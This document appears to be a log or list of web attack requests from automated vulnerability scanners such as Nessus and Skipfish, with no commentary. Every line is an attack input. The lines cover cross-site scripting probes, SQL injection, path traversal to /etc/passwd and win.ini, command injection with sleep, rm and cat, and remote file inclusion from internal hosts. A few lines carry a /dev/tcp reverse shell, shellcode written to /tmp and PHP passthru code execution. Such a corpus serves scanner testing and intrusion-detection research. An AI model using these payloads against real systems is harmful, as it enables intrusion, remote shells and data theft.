+/rpxyx07v.dll?<script>document.cookie="testbnli=1975;"</script>
+/pohentermine-prescription/
+/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>
+/ddoworrl.do?<script>document.cookie="testvlau=8517;"</script>
+/megabook/admin.cgi?login=<script>alert('vulnerable')</script>
+/initscripts/
+/gazette-subscription/
+/htbin/sensepost.exe?/c+dir
+/bmeun223.idc?<meta http-equiv=set-cookie content="testhhwu=7044">
+/examples/jsp/jsp2/jspx/showcat.php?cat=1'
+/b5xdqgz2.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/index.php?entry='
+/javascript/contents.exe
+/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/javascript/decl.exe
+/recordings/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331918989')</script>
+/ttxssh2_210/
+/projects/1/repository/annotate?rev=`0<&208-;exec 208<>/dev/tcp/192.168.202.118/26475;sh <&208 >&208 2>&208`
+/en-us/7o5qp766.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/main.php?logout=ver\x0c>q59849218&rem\x0c
+/scripts/secure.php?cfgprogdir=/etc/passwd\x00
+/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908835',null,null,null,null --
+/cgi.cgi/fileseek.cgi?foot=;cat /etc/passwd&head=
+/path_script/createurl.php?formurl=http://192.168.202.96:8080/swgnhpydbq0t?
+/index.php?op=default&date=200607' union select 1,1849014202,1,1,1,1,1,1,1,1--&blogid=1
+/xnoscript/
+/cacti/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00
+/examples/servlets/servlet/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd
+/javascript/tuscany.exe
+/main.php?stuff=ver,>q65716768&rem,
+/zv8tv7h8.asp?<meta http-equiv=set-cookie content="testcqwz=9752">
+/main.php?stuff="ping,-w,7000,-n,1,4.3.2.1|rem,
+/help.php?q="\x0duname >q75726259 #
+/v3axg1p8.idc?<meta http-equiv=set-cookie content="testxagh=6987">
+/top.php?stuff="ping\x0c-w\x0c10000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c
+/main.php?logout="del\x0cq37726783&rem\x0c
+/texis.exe/?-dump
+/launch.jsp?nfuse_application=<script>alert('vulnerable')</script>
+/phpmyadmin/index.php/1'
+/examples/jsp/jsp2/el/index.php?configfile=../../../../../../../../../etc/passwd
+/javascript/.htaccess.sfish/''''""""
+/en-us/9kr0ih0v.dll?<script>document.cookie="testzgnm=1183;"</script>
+/cgi-home/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
+/scripts/axdgpyi2bn6f.php3
+/fcgi-bin/gwweb.exe?help=bad-request
+/top.php?stuff="&del\xa0q12371867&rem\xa0
+/examples/jsp/checkbox/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wfppkgt4]));die;/*
+/nyvbv05h.html?<meta http-equiv=set-cookie content="testftxz=5980">
+/cgi-bin/server.pt?open=space&name=";}</script><script>alert('plumtree_name_xss.nasl')</script>
+/chat/register.php?register=yes&username=overg&email=<script>alert (\"vulnerable\")</script>&email1=<script>alert (\"vulnerable\")</script>
+/scripts/image.php?src=system/config/localconfig.php
+/archive.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??
+/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/main.php?frm_daynight=q51426141&frm_passwd=&frm_referer=http%3a//192.168.23.202/main.php%3flogout%3d1&frm_user=&scr_height=&scr_width=
+/bzuf9ozq.mscgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/boilerplate.asp?nfuse_template=../../boot.ini&amp;nfuse_currentfolder=/sslx0020directories|-|0|404_object_not_found
+/<meta http-equiv=set-cookie content="testgfbr=7014">
+/index.php?err=3&email=\"><script>alert(document.cookie)</script>
+/examples/jsp/num/admin/configset.php?settings_dir=/etc/passwd\x00
+/cgi-bin/main.cgi?board=free_board&command=down_load&filename=../../../../../../../../../../etc/passwd
+/help.php?q="sleep\x097\x09#
+/ywaxntrx.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/jsp2/el/home/search.asp?nchannel='1
+/moore's_law/
+/cgi-perl/texis.exe/junk
+/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331909370,1,1,1,1,1,1,1--&blogid=1
+/claroline/resourcelinker/resourcelinker.inc.php?clarolinerepositorysys=/etc/passwd\x00
+/zqqemp6j.htm?<script>cross_site_scripting.nasl</script>
+/examples/jsp/num/remindpasswd
+/examples/jsp/colors/wiki/edit.php?page=sandbox&suck_url=../kernel/config_inc.php&do_suck=h
+/main.php?stuff="\x0adel\x09q48139983\x09#
+/cgi-bin/fileseek2.cgi?head=;cat /etc/passwd|&foot=
+/examples/jsp/jsp2/jspx/index.php?string='
+/javascript/info.exe
+/javascript/.passwd.pfx
+/scripts/index.php?include_files[]=&include_files[query_string]=/etc/passwd
+/tukodz3j.cgi?<script>cross_site_scripting.nasl</script>
+/awstats/awstats.pl?migrate=|echo;/bin/echo -en "vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222" >> /tmp/ldlchhikup0;echo|awstats247374.txt
+/ows-bin/r.cgi?file=../../../../../../../../../../etc/passwd
+<script>document.cookie="testtbjy=7334;"</script>
+/jnt3f86c.kspx?<script>document.cookie="testcmax=9270;"</script>
+/search.aspx?keywords=<script>alert("413385588094")</script>
+/en-us/jnv890lt.nsf?<script>cross_site_scripting.nasl</script>
+/main.php?stuff=;sleep 9 #
+/help.php?q='|sleep 8 #
+/examples/jsp/colors/cgiip.exe/wservice=wsbroker1/webutil/ping.p
+/cacti/htmlscript?../../../../../../../../../etc/passwd
+/help.php?q="&sleep\x099\x09#
+/cgi-bin/starnet/addons/slideshow_full.php?album_name='1731917543
+/javascript/_source.exe
+/m4kkjf8l.aspx?<script>document.cookie="testyglc=8988;"</script>
+/zln2hm2z.aspx?<script>document.cookie="testblcp=8120;"</script>
+/help.php?q="&del q44114596 #
+/javascript/view.exe
+/cgi-bin/msmmask.exe?mask=/junk334
+/recordings/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search
+/manager/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
+/top.php?stuff=ver\x09>q92179245&rem\x09
+/jnt3f86c.php3?<meta http-equiv=set-cookie content="testcmax=9270">
+/scripts/printenv
+/javascript/www2.exe
+/top.php?stuff="\x0drm\x09q52865653\x09#
+/javascript/.passwd.bin
+/main.php?stuff="|ping,-w,8000,-n,1,1.2.3.4|rem,
+/top.php?stuff="\x0auname\x09>q52122221\x09#
+/item.fts?href="><script>alert("ftgate_44002.nasl")</script>;
+/cgis/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/en-us/account/index.php?templates_dir=/etc/passwd\x00
+/0rufe52p.idc?<script>cross_site_scripting.nasl</script>
+/cgi-home/fileseek2.cgi?foot=&head=;cat /etc/passwd|
+/en-us/n9xlumt5.dll?<script>cross_site_scripting.nasl</script>
+/cgi-bin/carbo.dll?icatcommand=..\..\..\..\..\..\winnt\win.ini&catalogname=catalog
+/v3axg1p8.nsf?<meta http-equiv=set-cookie content="testxagh=6987">
+/scripts/tomcat_proxy_directory_traversal.nasl1332009307
+/<meta http-equiv=set-cookie content="testmjct=1867">
+/examples/jsp/error/wa.exe?debug-show-version
+/miz4r5hz.nsf?<meta http-equiv=set-cookie content="testviqu=1270">
+/fo564rei.php3?<script>cross_site_scripting.nasl</script>
+/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+a+1f4+>>ctdn
+/javascript/logo.exe
+/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://192.168.202.96:8080/frznctvhi0i5?\x00
+/path_script/createurl.php?formurl=http://192.168.202.118:8080/tzhfyzkbomspvm?
+/cgi-bin/search.jsp?q=%"<script>alert(1332010405)</script>
+/examples/jsp/colors/search.php?submit=true&search=');
+/help.php?q="rm\x0cq65994111&rem\x0c
+/examples/jsp/sessions/pwcgi/smpwservicescgi.exe?target=http://www.nessus.org
+/help.php?q="\x0dsleep\x097\x09#
+/administrator/components/com_feederator/includes/tmsp/subscription.php?globals[mosconfig_absolute_path]=http://192.168.202.118:8080/zz5thkvtmlgl?
+/en-us/account/sendcard.php?view=1&id='sendcard_sql.nasl
+/de3v2dd9.html?<script>cross_site_scripting.nasl</script>
+/h5i6crm3.cgi?<script>document.cookie="testlihk=7070;"</script>
+/cacti/index.php?mod_id=2&kb_ask=</textarea><script>alert("cerberus_support_center_mult_flaws.nasl")</script>
+/javascript/.htpasswd.sfish/9-8
+/o35zot2r.php?<script>cross_site_scripting.nasl</script>
+/javascript/jboss.exe
+<meta http-equiv=set-cookie content="testsqmm=5713">
+/scripts/webnews.pl
+/javascript/dmsdump.exe
+/scripts/tsweb/
+/scripts/search.jsp?q=%"<script>alert(1332009303)</script>
+/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_6drqhnv_]));die;/*
+/b4vng02k.nsf?<script>document.cookie="testtrlh=3672;"</script>
+/javascript/survey.exe
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo";ls+-l;/tmp/xjmtpvepcz;"
+/j4oqyvga.php?<script>cross_site_scripting.nasl</script>
+/zroo33l4.dll?<meta http-equiv=set-cookie content="testiklc=904">
+/main.php?logout="\x0drm q33212666 #
+/top.php?stuff="ver >q85581856&rem 
+/main.php?logout=;sleep 7 #
+/main.inc.php?pathtoscript=@rfiurl
+/main.php?stuff="del,q26668686&rem,
+/manager/texis.exe/nessus
+/n1afe1y6.kspx?<script>cross_site_scripting.nasl</script>
+/w4996nr0.nsf?<meta http-equiv=set-cookie content="testttvs=7163">
+/examples/jsp/jsp2/jspx/shopper.cgi?newpage=../../../../../../etc/passwd
+/subscription-management/
+/javascript/net.exe
+/main.php?logout="&ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b
+/javascript/dba.exe
+/82q7ywa8.cfm?<meta http-equiv=set-cookie content="testpwew=1315">
+/u8yiqilu.kspx?<script>document.cookie="testswjp=6010;"</script>
+/en-us/account/login.pl?login=ledgersmb_script_code_exec.nasl&script=-e print "content-type: text/plain\x0d\x0a\x0d\x0a";system(id)&action=logout
+/javascript/jbossws.exe
+/help.php?q='rm q41634876 #
+/top.php?stuff="&sleep 8 #
+/javascript/trailers.exe
+/examples/jsp/jsp2/el/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
+/tothemaxss/
+/examples/jsp/checkbox/ncbook/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
+/drhcprxk.exe|dir
+/examples/jsp/num/commerce.cgi?page=../../../../../etc/passwd\x00index.html
+/scripts/samples/search/qfullhit.htw
+/index.php?p=..\..\..\..\..\..\..\..\..\..\..\..\boot.ini\x00
+/john battelle's searchblog/
+/en-us/hipkz026.cfm?<meta http-equiv=set-cookie content="testyrbs=2855">
+/w4996nr0.dll?<meta http-equiv=set-cookie content="testttvs=7163">
+/en-us/hipkz026.aspx?<meta http-equiv=set-cookie content="testyrbs=2855">
+/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
+/en-us/<script>cross_site_scripting.nasl</script>.php3
+/hostadmin/?page='
+/javascript/2009.exe
+/tocjscript1/
+/recordings/forumdisplay.php?fid=21"><script>x</script>
+/d7ktpmcq.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/1331904972-ror_session_fixation.nasl
+/u8yiqilu.do?<script>document.cookie="testswjp=6010;"</script>
+/recordings/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt\x00
+/en-us/hipkz026.mscgi?<script>document.cookie="testyrbs=2855;"</script>
+/top.php?stuff="ver&rem\xa0
+/main.php?stuff="|ping -w 9000 -n 1 4.3.2.1|rem 
+/top.php?stuff='\x0adel\x09q23871271\x09#
+/main.php?stuff=";sleep\x098\x09#
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo";ls+-l;chmod+555+/tmp/ukirnkmpbn;"
+/en-us/<script>cross_site_scripting.nasl</script>.jspa
+/cgi-bin/index.php?op=default&date=200607' union select 1,1759684664,1,1,1,1,1,1,1,1--&blogid=1
+/hjdzm96v.htm?<meta http-equiv=set-cookie content="testbyqe=7474">
+/examples/jsp/colors/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
+/en-us/account/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
+/abouttrialsubscription/
+/path_script/createurl.php?formurl=http://cirt.net/rfiinc.txt?
+/rv98iwjp.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/num/faq.php?action=&type=view&s=&id=-1' union select 0,1013365063,0,0,0,0,0--
+/backupscript/
+/fpnpp5zg.cgi?<meta http-equiv=set-cookie content="testyias=101">
+/m5103snj.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/?<meta http-equiv=set-cookie content="testnofv=4170">
+/javascript/get.exe
+/en-us/manager/launcher/apps/local?msgid=8839950.734222518743&amp;ns=launcher&amp;redirecting=true
+/cacti/bb_func_txt.php?pathtofiles=/etc/passwd\x00
+/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>
+/options.php?optpage=<script>alert('vulnerable!')</script>
+/mpgscript/
+/cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
+/examples/jsp/checkbox/kb.cgi?view='&lang=en
+/examples/jsp/jsp2/jspx/admin/addentry.php?phpbb_root_path=/etc/passwd\x00
+/tomcat-docs/appdev/sample/web/hello.jsp?test=<script>alert(tomcat_sample_hello_xss.nasl)</script>
+/admin/index.php?path_to_script=http://192.168.202.96:8080/4dckqcc0acprbz??&cmd=ls
+/_vti_bin/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/rpc/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/javascript/toggle.exe
+/javascript/f.exe
+/phpmyadmin/documentation.html?phpmyadmin=print(md5(acunetix_wvs_security_test));die();/*
+/recordings/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1
+/cfide/scripts/ajax/fckeditor/editor/filemanager/connectors/cfm/upload.cfm?command=fileupload&type=file&currentfolder=/flkzzubocd.jsp\x00
+/nyvbv05h.pl?<script>document.cookie="testftxz=5980;"</script>
+/awstats/awstats.pl?migrate=|echo;/bin/echo -en "vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222" >> /tmp/gjvtlghpjb0;echo|awstats360621.txt
+/vac1l5vm.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/sources/functions.php?root_path=/etc/passwd\x00
+/"france 24"/
+/recordings/smpwservicescgi.exe
+/cgi-bin/snpfiltered.pl?t=c&u=<script>foo</script>
+/examples/jsp/num/index.php?id=urjhxcl19w'
+/prescript/
+/javascript/cars.exe
+/manager/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>
+/javascript/document.war
+/scripts/sc877q2pzqne.shtml
+/phpmyadmin/demos/demo.browse.php?filename=/etc/passwd
+/vhzmaia2.php?<script>document.cookie="testkogj=3979;"</script>
+/r3le3om5.pl?<script>cross_site_scripting.nasl</script>
+/hipkz026.exe?<script>document.cookie="testyrbs=2855;"</script>
+/cgi.cgi/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
+/.htpasswd
+/scripts/basilix.php
+/jsp-examples/cal/cal2.jsp?time=8am<script>alert("tomcat_sample_cal2_xss.nasl")</script>
+/j734qobz.idc?<script>cross_site_scripting.nasl</script>
+/bin/c32web.exe/getimage?imagename=customeremail.txt\x00.pdf
+/scripts/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331905161
+/9kr0ih0v.exe?<script>document.cookie="testzgnm=1183;"</script>
+/1r8cfrlf.php?<meta http-equiv=set-cookie content="testydan=5106">
+/main.php?stuff=ping;-w;11000;-n;1;4.3.2.1|rem;
+/rubberstampsscriptalphabet/
+/addvip.php?msetstr["progsdir"]=http://192.168.202.96:8080/llumt7msyau5y?
+/main.php?logout="rm\x0bq12574322&rem\x0b
+/i7prbs22.html?<meta http-equiv=set-cookie content="testjnre=7328">
+/scripts/wihphoto/start.php
+/weq93ppb.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/zln2hm2z.fts?<meta http-equiv=set-cookie content="testblcp=8120">
+/ghswfouu.jsp?<script>document.cookie="testsqmm=5713;"</script>
+/adodb/server.php?sql='adodb_sql_sql_injection.nasl
+/y8pmygrp.x?<img src="javascript:alert(cross_site_scripting.nasl);">
+/top.php?stuff='uname >q24953383 #
+/manager/index.php?show=../../../../../../../../../../../etc/passwd\x00
+/cgi-bin/prn/../../../../../../../../../winnt/system32/ipconfig.exe
+/help.php?q=;rm\x09q81281166\x09#
+/examples/jsp/checkbox/index.php?cat_select=<script>foo</script>
+/servlet/webacc?user.lang=<script>foo</script>
+/help.php?q="ping\x0c-w\x0c10000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c
+/xfkun1ku.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/post.exe
+/en-us/oie504mr.cfm?<script>document.cookie="testtpby=7052;"</script>
+/hrttz9fj.htm?<script>document.cookie="testtbjy=7334;"</script>
+/aj3pf49c.jspa?<script>document.cookie="testnofv=4170;"</script>
+/javascript/htpasswd.c
+/copying/</p><body><script src=http://www.example.com/test?rnd=q64711831></script><p>
+/javascript/sl.exe
+/examples/jsp/jsp2/jspx/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id
+/javascript/.web.exe
+/zln2hm2z.htm?<meta http-equiv=set-cookie content="testblcp=8120">
+/ju0u7kfo.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/bmeun223.pl?<script>document.cookie="testhhwu=7044;"</script>
+/ht8pn8uq.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/help.php?q='\x0adel\x09q79344163\x09#
+/help.php?q="ping;-w;10000;-n;1;1.2.3.4|rem;
+/.../.../.../.../.../.../.../.../.../windows/win.ini
+/examples/servlets/servlet/starnet/addons/slideshow_full.php?album_name='1978429620
+/vac1l5vm.php3?<script>cross_site_scripting.nasl</script>
+/javascript/presentations.exe
+/help.php?q="rm q92991511 #
+/xsqln7eb.php3?<meta http-equiv=set-cookie content="testpcbb=9254">
+/script/ident/loginliste.php?path_inc=http://192.168.202.96:8080/4dckqcc0acprbz?
+/33y9gcqq.x?<script>document.cookie="testnvxc=4301;"</script>
+/en-us/account/index.php?op=default&date=200607' union select 1,674790948,1,1,1,1,1,1,1,1--&blogid=1
+/javascript/monitor.exe
+/scripts/h3d1n9eaqxv3.html
+/examples/jsp/jsp2/jspx/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/xssxmltest/
+/help.php?q="&uname #
+/dslpwt15.php3?<meta http-equiv=set-cookie content="testtkio=5454">
+/examples/servlets/servlet/al_initialize.php?alpath=/etc/passwd\x00
+/ao22ww7y.php3?<script>document.cookie="testqppc=8767;"</script>
+/cacti/index.php?sensor_program=<script>alert('phpsysinfo_multiple_xss.nasl');</script>
+/7o5qp766.cfm?<script>cross_site_scripting.nasl</script>
+/main.php?logout="ver\xa0>q32937989&rem\xa0
+/scripts/icat
+/6wb70v0b.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/5qnlm5z2.jspa?<script>document.cookie="testsixi=8451;"</script>
+/javascript/hipaa.exe
+/manager/faq.php?action=&type=view&s=&id=-1' union select 0,348320449,0,0,0,0,0--
+/if69ddo1.mscgi?<meta http-equiv=set-cookie content="testiabz=5220">
+/scripts/faxsurvey?cat /etc/passwd
+/javascript/filez.exe
+/script_path/config.inc.php?_path=http://192.168.202.96:8080/4dckqcc0acprbz??
+/en-us/account/index.pl/homels?func=add;class=webgui::asset::wobject::article;print `id`;
+/scripts/file.php?path=/etc/passwd\x00
+/6wb70v0b.mscgi?<script>cross_site_scripting.nasl</script>
+/iktok2bw.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/en-us/jnv890lt.cfc?<script>cross_site_scripting.nasl</script>
+/cgi-bin/index.php?search='><script>alert('autoindex_search_xss.nasl');</script>&searchmode=f
+/r3le3om5.cfm?<script>cross_site_scripting.nasl</script>
+/main.php?logout=';rm\x09q16263765\x09#
+/recordings/mmstdod.cgi?alternate_templates=| echo "content-type: text/html";echo "" ; id\x00
+/main.php?stuff="\x0arm\x09q48139983\x09#
+/nigdyniewieszcomo\xbfeszzyska\xe6atakwieledostraceniajest:&#40;/
+/scripts/bveygnpo6hkw.pl
+/j4drbkil.fts?<script>cross_site_scripting.nasl</script>
+/javascript/gump.exe
+/<script>cross_site_scripting.nasl</script>.nsf
+/main.php?logout=;del\x09q38215685\x09#
+/<script>document.cookie="testxagh=6987;"</script>
+/en-us/fo564rei.x?<script>cross_site_scripting.nasl</script>
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+8b+ec+50+60+6a+04+5a+50+8b+dc+e8+41+00+00+00+6a+00+68+6c+6c+6f+63+68+75+61++>>ctdn
+/<meta http-equiv=set-cookie content="testwldz=3506">
+/javascript/definition.exe
+/nyvbv05h.x?<script>document.cookie="testftxz=5980;"</script>
+/en-us/account/claroline/resourcelinker/resourcelinker.inc.php?clarolinerepositorysys=/etc/passwd\x00
+/help.php?q='\x0adel q19373947 #
+/javascript/rhtml.exe
+/t7tm4m0b.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cacti/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331909287')</script>
+/roads/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd\x00
+/javascript/document.gz
+/addvip.php?msetstr["progsdir"]=http://192.168.202.96:8080/txenjrxf3?
+/javascript/assets.exe
+/fo564rei.mscgi?<script>cross_site_scripting.nasl</script>
+/cgi-bin/index.php?id='union/**/select/**/0,0,763560836,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/zmvq66jy.nsf?<script>cross_site_scripting.nasl</script>
+/javascript/space.exe
+/edzaia0i.dll?<script>cross_site_scripting.nasl</script>
+/examples/jsp/num/index.php?site=../../../../../../../../etc/passwd\x00
+/jw64yq8u.cfm?<meta http-equiv=set-cookie content="testylfu=1313">
+/cgi-bin/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||
+/examples/jsp/error/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
+/iktok2bw.pl?<script>cross_site_scripting.nasl</script>
+/eei78ore.x?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/documentation.html?phpmyadmin=&cat /etc/passwd&
+/....\....\....\....\....\....\....\....\....\windows\win.ini
+/mpcgi/sensepost.exe?/c+dir
+/cgi-bin/visitor.exe
+/scripts/rx9ysf2iwv4j.pl
+/7u1pb2xi.htm?<script>document.cookie="testlwwz=718;"</script>
+/scripts/blog/mt-check.cgi
+/scripts/zq9frlz6fcfp.php3
+/cgi-bin/index.php?act=arcade&do=stats&gameid=1'
+/cgi-bin/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl
+/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd
+/phpmyadmin/includes/converter.inc.php?include_path=/etc/passwd\x00
+/scripts/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
+/scripts/2sfdqydfaknx.pl
+/help.php?q="&rm;q83399542&rem;
+/scripts/bpk_bsfe_4vq.sh
+/8t9v8k7x.nsf?<script>document.cookie="testhvje=9403;"</script>
+//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
+/t7tm4m0b.fts?<script>cross_site_scripting.nasl</script>
+/weq93ppb.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/www/delivery/fc.php?max_type=../../../../../../../../../../etc/passwd\x00
+/javascript/devel.exe
+/login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
+/cgi-sys/c32web.exe/changeadminpassword
+/cgis/ion-p?page=../../../../../etc/passwd
+/en-us/i686v90l.cgi?<script>document.cookie="testfutf=1550;"</script>
+/javascript/maps.exe
+/recordingsmultihtml.pl?multi=/etc/passwd\x00html
+/index.php?config["sipssys"]=http://192.168.202.118:8080/ghl9il?
+/g8nu2yy7.html?<script>cross_site_scripting.nasl</script>
+/jnt3f86c.php?<script>document.cookie="testcmax=9270;"</script>
+/examples/jsp/sessions/search.cgi?..\..\..\..\..\..\winnt\win.ini
+/en-us/account/review.php?id=1&cat=&subcat="><script>alert('phpmydirectory_multiple_xss.nasl');</script>
+/a.jsp/<script>alert('vulnerable')</script>
+/script//ident/index.php?path_inc=http://192.168.202.118:8080/ghl9il?
+/33y9gcqq.idc?<meta http-equiv=set-cookie content="testnvxc=4301">
+/main.php?stuff="\x0auname >q72652917 #
+/comments.php?scriptpath=http://192.168.202.118:8080/moclyxlwqyfjnp??
+/javascript/.passwd.orig
+/v3axg1p8.dll?<meta http-equiv=set-cookie content="testxagh=6987">
+/subscriptions.orig
+/1r8cfrlf.asp?<meta http-equiv=set-cookie content="testydan=5106">
+/5o9zq43e.jspa?<script>cross_site_scripting.nasl</script>
+/scripts/mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
+/examples/jsp/num/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
+/examples/jsp/num/backend/classes.php?include_path=../lib/jinzora.js\x00
+/h4bi26jd.x?<meta http-equiv=set-cookie content="testhrzx=1150">
+/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904366&lang_crm=../../vtigerservice.php\x00
+/pbserver/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904220&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
+/?<meta http-equiv=set-cookie content="testiabz=5220">
+/fc9t54l7.cgi?<meta http-equiv=set-cookie content="testggad=2000">
+/3hlysl2x.fts?<script>document.cookie="testgjbe=8505;"</script>
+/qczkquis.pl?<script>document.cookie="testkwlg=5591;"</script>
+/static//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+/scripts/check-lom.php?etcdir=http://192.168.202.118:8080/zz5thkvtmlgl?
+/examples/servlets/servlet/inc/functions.inc.php?config[ppa_root_path]=/etc/passwd\x00
+/index.php?entry='
+/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332008332,1,1,1,1,1,1,1--&blogid=1
+/comments.php?scriptpath=http://192.168.202.96:8080/no4ghqiguzhst??
+/fmnveedu.jspa?<meta http-equiv=set-cookie content="testgfbr=7014">
+/script/template/index.php?main_page_directory=http://192.168.202.96:8080/4dckqcc0acprbz?
+<meta http-equiv=set-cookie content="testzgnm=1183">
+<meta http-equiv=set-cookie content="testkgqo=204">
+/mysubscription/
+/examples/servlets/servlet/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00
+/scripts/buoalakxhatu.cgi
+/tuwjta1w.kspx?<meta http-equiv=set-cookie content="testpokn=7494">
+/phpmyadmin/menu_dx.php?site_path=../../../../../../../../../../etc/passwd\x00
+/r3le3om5.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/title.exe
+/ju0u7kfo.jspa?<script>cross_site_scripting.nasl</script>
+/scripts/t769qwej0llr.php
+/hipkz026.php3?<meta http-equiv=set-cookie content="testyrbs=2855">
+/default.php?error_message=<script language=javascript>window.alert(document.cookie);</script>
+/scripts/nffhikq061nq.php
+/top.php?stuff="rm;q48162266&rem;
+/ows-bin/.passwd
+/6dlc2zm9.asp?<meta http-equiv=set-cookie content="testqpux=4016">
+/javascript/.htpasswd.sfish
+/javascript/en.exe
+/examples/jsp/num/ion-p.exe?page=c:\\winnt\\win.ini
+/en-us/account/a1disp3.cgi?/../../../../../../etc/passwd
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+33+c9+51+52+53+ff+75+00+ff+54+05+04+85+c0+7e+01+c3+68+61+64+00+00+68+54+68++>>esbq
+/top.php?stuff="ping,-w,7000,-n,1,4.3.2.1|rem,
+/1qwv2p5p.php?<meta http-equiv=set-cookie content="testvqcy=252">
+/javascript/error-log.exe
+/scripts/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd
+/javascript/document.bin
+/zuihld5m.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/index.php?entry='
+/examples/jsp/sessions/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00
+/m2fpztty.php3?<script>cross_site_scripting.nasl</script>
+/bmeun223.kspx?<meta http-equiv=set-cookie content="testhhwu=7044">
